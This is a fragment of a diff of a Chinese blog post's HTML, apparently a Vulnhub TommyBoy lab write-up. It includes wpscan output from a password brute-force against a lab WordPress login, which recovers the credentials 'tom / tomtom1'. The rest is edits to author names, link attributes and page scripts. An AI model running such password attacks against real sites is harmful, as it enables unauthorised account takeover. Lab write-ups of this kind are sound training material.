http://192.168.80.13/prehistoricforest/wp-content/themes/twentysixteen/</span><br><span class="line"> | Last Updated: 2019-05-07T00:00:00.000Z</span><br><span class="line"> | Readme: http://192.168.80.13/prehistoricforest/wp-content/themes/twentysixteen/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.0</span><br><span class="line"> | Style URL: http://192.168.80.13/prehistoricforest/wp-content/themes/twentysixteen/style.css?ver=4.5.20</span><br><span class="line"> | Style Name: Twenty Sixteen</span><br><span class="line"> | Style URI: https://wordpress.org/themes/twentysixteen/</span><br><span class="line"> | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...</span><br><span class="line"> | Author: the WordPress team</span><br><span class="line"> | Author URI: https://wordpress.org/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - http://192.168.80.13/prehistoricforest/wp-content/themes/twentysixteen/style.css?ver=4.5.20, Match: &#x27;Version: 1.2&#x27;</span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="line"></span><br><span class="line">[i] No plugins Found.</span><br><span class="line"></span><br><span class="line">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span><br><span class="line"> Checking Config Backups - Time: 00:00:03 &lt;=============================&gt; (21 / 21) 100.00% Time: 00:00:03</span><br><span class="line"></span><br><span class="line">[i] No Config Backups Found.</span><br><span class="line"></span><br><span class="line">[+] Performing password attack on Wp Login against 1 user/s</span><br><span class="line">Error: Server error, try reducing the number of threads.                                                  </span><br><span class="line">Trying tom / tomtom1 Time: 00:06:20 &lt;=============================&gt; (24700 / 24700) 100.00% Time: 00:06:20</span><br><span class="line">[SUCCESS] - tom / tomtom1                                                                                 </span><br><span class="line"></span><br><span class="line">[i] Valid Combinations Found:</span><br><span class="line"> | Username: tom, Password: tomtom1</span><br><span class="line"></span><br><span class="line">[+] WPVulnDB API OK</span><br><span class="line"> | Plan: free</span><br><span class="line"> | Requests Done (during the scan): 2</span><br><span class="line"> | Requests Remaining: 44</span><br><span class="line"></span><br><span class="line">[+] Finished: Thu Feb 20 03:37:19 2020</span><br><span class="line">[+] Requests Done: 24772</span><br><span class="line">[+] Cached Requests: 5</span><br><span class="line">[+] Data Sent: 8.24 MB</span><br><span class="line">[+] Data Received: 107.827 MB</span><br><span class="line">[+] Memory used: 1.162 GB</span><br><span class="line">[+] Elapsed time: 00:07:59</span><br></pre></td></tr></table></figure>
 <ul>
 <li>wpscan参数说明<ul>
@@ -414,21 +413,21 @@
 <div>
 <ul class="post-copyright">
   <li class="post-copyright-author">
-    <strong>本文作者： </strong>Dana Shaw
+    <strong>本文作者： </strong>肖坤稼
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
     <a href="https://dana5haw.com/posts/ZH-CN/Vulnhub_TommyBoy1.0.html" title="vulnhub靶机练习之TommyBoy1dot0">https://dana5haw.com/posts/ZH-CN/Vulnhub_TommyBoy1.0.html</a>
   </li>
   <li class="post-copyright-license">
-    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
   </li>
 
   <div class="wechat_OA">
 	<span>欢迎关注我的公众号(Welcome to follow me on Wechat)</span>
 	<br>
     <!-- 这里添加你的二维码图片 -->
-	<img src ="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
+	<img src="https://v2ray.dana5haw.com:8008/images/2021/08/03/qrcode_for_gh_9b7280eb1edc_258.jpg">
 </div>
 
 </ul>
@@ -529,18 +528,17 @@
       <div class="post-toc-wrap sidebar-panel">
           <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83"><span class="nav-number">1.</span> <span class="nav-text">搭建靶机环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA"><span class="nav-number">2.</span> <span class="nav-text">攻击机</span></a></li></ol></div>
       </div>
-        <div id="">
+        <div id>
 	  <canvas id="canvas" style="width:60%;">
-	    </div>
+	    </canvas></div>
 	      <script type="text/javascript" src="/js/canvas-dance-time.js"></script>
       <!--/noindex-->
 
 
       <div class="site-overview-wrap sidebar-panel">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <img class="site-author-image" itemprop="image" alt="Dana Shaw"
-      src="/./images/photo.jpg">
-  <p class="site-author-name" itemprop="name">Dana Shaw</p>
+    <img class="site-author-image" itemprop="image" alt="肖坤稼" src="/./images/photo.jpg">
+  <p class="site-author-name" itemprop="name">肖坤稼</p>
   <div class="site-description" itemprop="description">连尘埃也想收藏</div>
 </div>
 <div class="site-state-wrap motion-element">
@@ -548,7 +546,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">255</span>
+          <span class="site-state-item-count">256</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -568,13 +566,13 @@
 </div>
   <div class="links-of-author motion-element">
       <span class="links-of-author-item">
-        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+        <a href="https://github.com/DanaShaw" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;DanaShaw" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+        <a href="mailto:danaxkj@gmail.com" title="E-Mail → mailto:danaxkj@gmail.com" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+        <a href="https://weibo.com/u/5742631593" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5742631593" rel="external nofollow noopener noreferrer" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
       </span>
       <span class="links-of-author-item">
         <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
@@ -589,7 +587,7 @@
     </div>
     <ul class="links-of-blogroll-list">
         <li class="links-of-blogroll-item">
-          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="noopener" target="_blank">windows提权学习</a>
+          <a href="https://whale3070.github.io/" title="https:&#x2F;&#x2F;whale3070.github.io&#x2F;" rel="external nofollow noopener noreferrer" target="_blank">windows提权学习</a>
         </li>
     </ul>
   </div>
@@ -636,7 +634,7 @@
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
-  <span class="author" itemprop="copyrightHolder">Dana Shaw</span>
+  <span class="author" itemprop="copyrightHolder">肖坤稼</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
@@ -650,7 +648,7 @@
 </div>
 
 
-  <script src='https://unpkg.com/mermaid@/dist/mermaid.min.js'></script>
+  <script src="https://unpkg.com/mermaid@/dist/mermaid.min.js"></script>
   <script>
     if (window.mermaid) {
       mermaid.initialize({theme: 'default'});
@@ -692,7 +690,7 @@
 
   
   
-  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
   <script src="/lib/anime.min.js"></script>
   <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
   <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
@@ -715,6 +713,15 @@
 
 
   
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
 
 
 
@@ -771,15 +778,9 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
 });
 </script>
 
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222"
-     crossorigin="anonymous"></script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3938956891324222" crossorigin="anonymous"></script>
 <!-- sidebar -->
-<ins class="adsbygoogle"
-     style="display:block"
-     data-ad-client="ca-pub-3938956891324222"
-     data-ad-slot="6163650450"
-     data-ad-format="auto"
-     data-full-width-responsive="true"></ins>
+<ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-3938956891324222" data-ad-slot="6163650450" data-ad-format="auto" data-full-width-responsive="true"></ins>
 <script>
      (adsbygoogle = window.adsbygoogle || []).push({});
 </script>
@@ -787,7 +788,7 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
   <script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
   
   
-   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;"></canvas> 
    <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
    <script type="text/javascript" src="/js/fireworks.js"></script>
 
